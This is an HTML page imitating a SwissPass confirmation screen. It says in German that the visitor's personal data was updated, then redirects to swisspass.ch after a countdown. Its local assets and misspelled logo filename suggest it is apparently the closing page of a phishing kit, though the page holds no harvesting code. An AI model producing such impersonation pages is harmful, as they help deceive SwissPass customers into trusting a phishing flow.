<!DOCTYPE html>
<html lang="de-ch" class="js no-touch hashchange history csstransforms csstransforms3d csstransitions svg inlinesvg svgclippaths placeholder modern">
<head>
    <meta charset="UTF-8">
    <title>SwissPass - Aktualisierung erfolgreich</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="content-language" content="de">
    <meta name="description" content="Bestätigung der erfolgreichen Datenaktualisierung beim SwissPass">
    <link rel="icon" type="image/x-icon" href="./favicon.ico?v=20140709-1126">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #e30613;
            margin: 0;
            padding: 0;
        }
        .confirmation-container {
            max-width: 400px;
            margin: 80px auto;
            background: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 15px rgba(0,0,0,0.2);
            text-align: center;
        }
        .logo {
            margin-bottom: 25px;
        }
        .logo img {
            height: 50px;
        }
        .checkmark {
            font-size: 60px;
            color: #4CAF50;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-bottom: 15px;
        }
        p {
            color: #555;
            margin: 10px 0;
        }
        .countdown {
            font-weight: bold;
            margin-top: 20px;
            color: #e30613;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 12px;
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="confirmation-container">
        <div class="logo">
            <img src="./swispass logo.png" alt="SwissPass Logo">
        </div>
        <div class="checkmark">✔</div>
        <h2>Aktualisierung erfolgreich</h2>
        <p>Ihre persönlichen Daten wurden erfolgreich aktualisiert.</p>
        <p>Sie werden in wenigen Sekunden automatisch weitergeleitet.</p>
        <div class="countdown">Weiterleitung in <span id="countdown">10</span> Sekunden...</div>
    </div>

    <div class="footer">
        © SwissPass – Alle Rechte vorbehalten
    </div>

    <script>
        let seconds = 10;
        const countdown = document.getElementById('countdown');
        const interval = setInterval(() => {
            seconds--;
            countdown.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(interval);
                window.location.href = "https://www.swisspass.ch";
            }
        }, 1000);
    </script>
</body>
</html>
